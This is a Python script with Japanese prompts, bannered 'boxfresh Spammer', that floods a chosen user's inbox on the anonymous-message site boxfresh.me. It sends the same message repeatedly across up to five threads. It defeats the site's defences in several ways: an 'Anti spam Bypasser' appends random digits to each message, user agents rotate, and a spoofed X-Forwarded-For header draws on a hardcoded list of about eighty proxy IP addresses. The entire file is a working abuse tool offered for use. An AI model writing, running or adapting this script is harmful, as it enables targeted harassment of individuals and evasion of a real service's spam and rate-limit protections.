


import requests
import random
import threading as th
import time
#ーーーーー
def send():
  if bypass == 1:
    data = {
      "d": User,
      "content": msg+ "|" + str(random.randint(100,999)),
    }
  else:
    data = {
    "d": User,
    "content": msg,
  }
  r = requests.post(url, headers=headers, data=data)
  print(f'メッセージ : {msg}, ステータスコード : {r.status_code}\n')
#ーーーーー

print("""

  _                __               _        _____                                           
 | |              / _|             | |      / ____|                                          
 | |__   _____  _| |_ _ __ ___  ___| |__   | (___  _ __   __ _ _ __ ___  _ __ ___   ___ _ __ 
 | '_ \ / _ \ \/ /  _| '__/ _ \/ __| '_ \   \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
 | |_) | (_) >  <| | | | |  __/\__ \ | | |  ____) | |_) | (_| | | | | | | | | | | |  __/ |   
 |_.__/ \___/_/\_\_| |_|  \___||___/_| |_| |_____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|   
                                                  | |                                        
                                                  |_|                                        
""")
time.sleep(random.randint(1,3))
User = input("相手のurl(or id) : ")
if 'is.php?d=' in User:
    User = User.replace("https://boxfresh.me/is.php?d=","")
elif 'boxfresh-jp.com/index.php?id=' in User:
    User = User.replace("https://boxfresh-jp.com/index.php?id=","")
else:
    User = User.replace("https://boxfresh.me/","")
count = int(input("何回送信しますか? : "))
msg = input("送信するメッセージ : ")
while True:
    thread = int(input('処理効率\n[1] ×1\n[2] ×2\n[3] ×4\n[4] ×5\n※効率が増える=同時起動数が増える\n'))
    if thread == 1 or thread == 2 or thread == 3 or thread == 4:
        break
    else:
        continue
while True:
    bypass = int(input("Anti spam Bypasserをつけますか?\n[1] つける\n[2]つけない\n"))
    if bypass == 1 or bypass == 2:
        break
    else:
        continue




UAlist = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3864.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:67.0) Gecko/20100101 Firefox/67.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:68.0) Gecko/20100101 Firefox/68.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0","Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/1.6.5b18.09.26.16 Mobile/16A366 Safari/605.1.15 _id/000002"]
ip_address = ["188.95.20.138:5678","182.253.183.98:80","41.222.196.52:8080","208.159.214.25:80","205.185.125.140:5556","203.66.14.174:3128","91.121.163.147:80","180.94.83.122:8080","84.254.0.86:32650","114.106.170.68:8089","177.74.143.97:4145","222.124.151.235:3128","209.94.61.32:3128","200.108.205.182:4153","103.175.46.104:3125","107.17.92.18:8080","110.138.204.45:3128","2.135.242.74:9090","190.151.144.1:8080","181.3.141.171:1080","89.218.185.141:8081","91.107.203.75:8080","172.64.207.85:80","128.199.196.31:26541","202.30.245.3:80","223.4.179.153:3128","183.89.59.83:8080","212.119.105.65:3128","207.4.218.98:80","110.74.218.147:8080","109.207.61.148:8090","54.38.181.125:80","211.167.103.140:80","59.33.138.46:38801","162.159.246.231:80","103.85.122.20:4145","192.111.137.34:18765","41.57.7.17:6060","106.53.60.114:1080","190.36.158.230:8080","77.89.196.202:4153","176.108.131.1:8080","113.161.145.229:4153","192.141.196.129:8080","222.74.220.228:80","190.39.192.30:8080","41.234.7.34:80","123.14.220.117:18186","14.255.65.195:33333","194.163.132.76:4750","202.178.120.139:8080","117.57.93.110:8089","195.172.16.2:8080","203.144.242.71:8080","192.111.135.18:18301","111.1.36.24:80","102.38.0.4:8080","185.216.18.138:44550","119.13.111.169:8085","118.113.100.162:18186","195.31.179.218:8080","200.8.34.139:8080","183.12.88.96:8888","200.208.251.212:8080","202.166.205.87:58637","119.167.231.184:80","60.190.136.90:3128","118.244.190.3:80","186.88.208.75:8080","91.221.70.248:9100","110.18.2.237:38801","79.111.13.155:50625","178.128.148.69:3128","202.43.113.20:8888","24.234.142.123:31008","183.164.243.146:8089","213.109.6.85:60269","193.136.20.4:80","201.8.27.146:8080","123.120.40.251:80"]


url = "https://boxfresh.me/ia.php"
headers = {
    "Host": "boxfresh.me",
    "User-Agent": random.choice(UAlist),
    "X-Forwarded-For": random.choice(ip_address),
    "Origin": "https://boxfresh.me",
}


print("メッセージ : " + msg + "\nユーザー : " + User)
time.sleep(1)
for _ in range(count):
  if thread == 1:
    send()
  elif thread == 2:
    threadA = th.Thread(target=send) 
    threadB = th.Thread(target=send)
    threadA.start()
    threadB.start()
    threadA.join()
    threadB.join()
  elif thread == 3:
    threadA = th.Thread(target=send) 
    threadB = th.Thread(target=send)
    threadC = th.Thread(target=send) 
    threadD = th.Thread(target=send)
    threadA.start()
    threadB.start()
    threadC.start()
    threadD.start()
    threadA.join()
    threadB.join()
    threadC.join()
    threadD.join()
  elif thread == 4:
    threadA = th.Thread(target=send) 
    threadB = th.Thread(target=send)
    threadC = th.Thread(target=send) 
    threadD = th.Thread(target=send)
    threadE = th.Thread(target=send)
    threadA.start()
    threadB.start()
    threadC.start()
    threadD.start()
    threadE.start()
    threadA.join()
    threadB.join()
    threadC.join()
    threadD.join()
    threadE.join()
